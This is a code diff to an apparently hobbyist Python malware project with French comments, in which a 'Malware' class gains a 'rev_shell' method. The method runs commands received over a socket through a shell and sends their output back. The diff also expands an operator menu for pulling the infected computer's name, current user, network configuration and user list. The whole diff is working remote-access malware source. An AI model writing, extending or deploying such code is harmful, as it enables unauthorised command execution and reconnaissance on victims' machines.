@@ -1,5 +1,5 @@
 import socket, os, sys, time
-
+import subprocess
 """
 Classe contenant les variables communes entre client et serveur
 """
@@ -47,8 +47,12 @@ class Malware(Machine):
             print("Nous avons quitter avec une erreur")
             time.sleep(3)
 
-    def get_socket(self):
-        return self.my_socket
+    def rev_shell(self, cmd):
+        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        out_byte = var.stdout.read() + var.stderr.read()
+        out_str = out_byte.decode("utf-8", errors="replace")
+        self.send(out_str)
+        print(out_str)
 
 
 """
@@ -101,29 +105,36 @@ class Client(Machine):
         return choix
 
     def choice_information(self):
-        print("Press 1 to get the infected computer name")
+        print("\nPress 1 to get the infected computer name")
         print("Press 2 to see who is the current user")
         print("Press 3 to get the network configuration")
         print("Press 4 to get the list of users")
+        print("Press 0 to quit")
         choix2 = input()
-        while int(choix2) in(1, 5):
+        while int(choix2) != 0:
             if choix2 == "1":
                 self.send("computer")
                 print("\nComputer name : ", end="")
+                self.receive()
             elif choix2 == "2":
                 self.send("current")
+                print("\nCurrent user : ", end="")
+                self.receive()
             elif choix2 == "3":
                 self.send("network")
+                print("\nNetwork config : ", end="")
+                self.receive()
             elif choix2 == "4":
                 self.send("users")
+                self.receive()
             else:
                 print("Enter a valid value!")
-
-            if int(choix2) in (1, 5):
-                self.receive()
 
             print("\n\nPress 1 to get the infected computer name")
             print("Press 2 to see who is the current user")
             print("Press 3 to get the network configuration")
             print("Press 4 to get the list of users")
+            print("Press 0 to quit")
             choix2 = input()
+        self.send("quit")
+        self.quit()
